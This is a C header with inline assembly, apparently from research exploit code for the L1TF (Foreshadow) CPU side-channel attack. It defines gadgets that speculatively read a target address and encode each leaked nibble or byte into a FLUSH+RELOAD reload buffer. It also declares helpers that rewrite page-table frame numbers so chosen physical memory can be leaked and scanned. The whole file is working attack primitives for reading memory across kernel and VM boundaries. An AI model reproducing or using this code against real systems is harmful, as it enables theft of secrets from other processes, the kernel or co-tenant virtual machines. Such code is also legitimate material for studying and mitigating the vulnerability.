#pragma once
#include "constants.h"
#include "ret2spec.h"
#include <stddef.h>
#include <stdint.h>

// The reload buffer will be used to leak a byte at the time.
// However, instead of hving a 256 page-sized reload buffer,
// we only have a 32 page-sized buffer.
// Instead of leaking byte-for-byte, and thus needing a covert
// channel "resolution" of 2^8 = 256 pages per byte we want to leak,
// we can leak nibble-for-nibble. This requires just 2^4 = 16 pages
// per nibble per FLUSH+RELOAD iteration.
// The tradeoff is that we require a larger speculative window, and need
// some additional post processing to reconstruct the data.
#define AMOUNT_OF_OPTIONS_IN_NIBBLE 16
#define AMOUNT_OF_NIBBLES_PER_RELOAD 2
#define AMOUNT_OF_RELOAD_PAGES (AMOUNT_OF_OPTIONS_IN_NIBBLE * AMOUNT_OF_NIBBLES_PER_RELOAD)
typedef uint8_t bit_reload_buffer[PAGE_SIZE];
typedef uint8_t reload_buffer_t[AMOUNT_OF_NIBBLES_PER_RELOAD][AMOUNT_OF_OPTIONS_IN_NIBBLE][PAGE_SIZE];

#define AMOUNT_OF_BYTE_OPTIONS 256
typedef uint8_t full_reload_buffer_t[AMOUNT_OF_BYTE_OPTIONS][PAGE_SIZE];

static inline __attribute__((always_inline)) void asm_l1tf_leak_high_nibble(void *leak_addr,
                                                                            reload_buffer_t reload_buffer) {
  __asm__ volatile("xor %%rax, %%rax\n"
                   "movl $0xB1ABE849, %%r12d\n"
                   "movl $0xCD7E16F1, %%r13d\n"
                   "leaq handler%=(%%rip), %%r14\n"
                   "movq (%[leak_addr]), %%rax\n"
                   "and $0xf0, %%rax\n"
                   "shl $0x8, %%rax\n"
                   "prefetcht0 (%[nibble], %%rax)\n"
                   "mfence\n"
                   "handler%=:"

                   ::[leak_addr] "r"(leak_addr),
                   [nibble] "r"(reload_buffer[0])
                   : "rax", "r12", "r13", "r14");
}

static inline __attribute__((always_inline)) void asm_l1tf_leak_low_nibble(void *leak_addr,
                                                                           reload_buffer_t reload_buffer) {
  __asm__ volatile("xor %%rax, %%rax\n"
                   "movl $0xB1ABE849, %%r12d\n"
                   "movl $0xCD7E16F1, %%r13d\n"
                   "leaq handler%=(%%rip), %%r14\n"
                   "movq (%[leak_addr]), %%rax\n"
                   "and $0x0f, %%rax\n"
                   "shl $0xc, %%rax\n"
                   "prefetcht0 (%[nibble], %%rax)\n"
                   "mfence\n"
                   "handler%=:"

                   ::[leak_addr] "r"(leak_addr),
                   [nibble] "r"(reload_buffer[1])
                   : "rax", "r12", "r13", "r14");
}

static inline __attribute__((always_inline)) void asm_l1tf_leak_nibbles(void *leak_addr,
                                                                        reload_buffer_t reload_buffer) {
  __asm__ volatile("xor %%rax, %%rax\n"
                   "xor %%rbx, %%rbx\n"
                   "movl $0xB1ABE849, %%r12d\n"
                   "movl $0xCD7E16F1, %%r13d\n"
                   "leaq handler%=(%%rip), %%r14\n"
                   "movq (%[leak_addr]), %%rax\n"
                   "movq %%rax, %%rbx\n"
                   "and $0xf0, %%rax\n"
                   "and $0x0f, %%rbx\n"
                   "shl $0x8, %%rax\n"
                   "shl $0xc, %%rbx\n"
                   "prefetcht0 (%[nibble0], %%rbx)\n"
                   "prefetcht0 (%[nibble1], %%rax)\n"
                   "mfence\n"
                   "inf_loop%=:\n"
                   "  pause\n"
                   "  jmp inf_loop%=\n"
                   "handler%=:"

                   ::[leak_addr] "r"(leak_addr),
                   [nibble0] "r"(reload_buffer[0]), [nibble1] "r"(reload_buffer[1])
                   : "rax", "rbx", "r12", "r13", "r14");
}

static inline __attribute__((always_inline)) void asm_l1tf_leak_full(void *leak_addr,
                                                                     full_reload_buffer_t reload_buffer) {
  __asm__ volatile("xor %%rax, %%rax\n"
                   "movl $0xB1ABE849, %%r12d\n"
                   "movl $0xCD7E16F1, %%r13d\n"
                   "leaq handler%=(%%rip), %%r14\n"
                   "movq (%[leak_addr]), %%rax\n"
                   "and $0xff, %%rax\n"
                   "shl $0xc, %%rax\n"
                   "prefetcht0 (%[reload_buffer], %%rax)\n"
                   "mfence\n"
                   "inf_loop%=:\n"
                   "  pause\n"
                   "  jmp inf_loop%=\n"
                   "handler%=:"

                   ::[leak_addr] "r"(leak_addr),
                   [reload_buffer] "r"(reload_buffer)
                   : "rax", "r12", "r13", "r14");
}

static inline __attribute__((always_inline)) void
asm_l1tf_leak_full_4_byte_mask(void *leak_addr, full_reload_buffer_t reload_buffer, const uint64_t subtract) {
  __asm__ volatile("xor %%rax, %%rax\n"
                   "movq $0xffffffff, %%r15\n"
                   "movl $0xB1ABE849, %%r12d\n"
                   "movl $0xCD7E16F1, %%r13d\n"
                   "leaq handler%=(%%rip), %%r14\n"
                   "movq (%[leak_addr]), %%rax\n"
                   "andq %%r15, %%rax\n"
                   "subq %[subtract], %%rax\n"
                   "rorq $24, %%rax\n"
                   "shl $0xc, %%rax\n"
                   "prefetcht0 (%[reload_buffer], %%rax)\n"
                   "mfence\n"
                   "inf_loop%=:\n"
                   "  pause\n"
                   "  jmp inf_loop%=\n"
                   "handler%=:"

                   ::[leak_addr] "r"(leak_addr),
                   [reload_buffer] "r"(reload_buffer), [subtract] "r"(subtract)
                   : "rax", "r12", "r13", "r14", "r15");
}

uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]);

typedef struct {
  // The virtual address that will be passed to the l1tf leaking code
  void *leak;
  // The original pfn before we started to modify it
  size_t original_pfn;
  // A pointer to PTE of the virtual address in the the
  // physical-memory-to-userspace mapping
  size_t *pte_ptr;
} leak_addr_t;

typedef struct {
  uintptr_t start;
  uintptr_t end;
  size_t stride;
} scan_opts_t;

leak_addr_t l1tf_leak_buffer_create(void);
void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr);
void l1tf_leak_buffer_free(leak_addr_t *leak);

reload_buffer_t *l1tf_reload_buffer_create(void);
void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer);

void *l1tf_spawn_leak_page(void);

int l1tf_main(int argc, char *argv[argc]);
